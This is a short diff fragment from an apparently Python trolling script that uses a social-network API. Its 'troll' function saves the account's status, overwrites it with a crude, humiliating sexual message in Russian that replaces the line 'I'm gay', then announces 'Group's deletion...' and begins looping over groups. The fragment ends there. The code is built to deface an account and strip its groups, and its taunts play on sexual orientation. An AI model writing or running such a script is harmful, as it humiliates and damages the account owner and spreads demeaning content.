@@ -4,7 +4,7 @@ pubs = [151233321,65797052,102413048,89243825,61515264,88667014,180103853,101105
 def troll ():
 	w = open ('backup', 'w')
 	w.write (api.status.get()['text'] + '\n')
-	api.status.set(text="Я гей")
+	api.status.set(text="Я люблю большой х*й , поцаны ну вы поняли")
 	print ("\n\033[32mGroup's deletion...")
 	time.sleep (0.5)
 	for group in groups:
